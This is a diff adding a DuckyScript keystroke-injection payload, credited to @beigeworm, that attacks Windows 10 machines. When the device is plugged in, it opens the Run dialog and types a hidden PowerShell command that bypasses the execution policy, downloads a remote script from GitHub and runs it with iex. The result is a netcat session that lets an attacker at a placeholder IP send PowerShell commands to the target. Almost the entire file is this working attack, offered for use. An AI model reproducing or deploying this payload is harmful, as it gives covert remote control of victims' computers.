@@ -1,0 +1,20 @@
+
+REM Title: Beigeworm's Netcat Client with Extra Fuctions
+REM Author: @beigeworm
+REM Description: This script connects target computer with a netcat session to send powershell commands.
+REM EXTRA FUNCTIONS - (to see extra functions type "options" once connected..)
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace IP_HERE with your netcat attacker IP Address.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $ip='IP_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/NC-Func.ps1 | iex
+ENTER
+
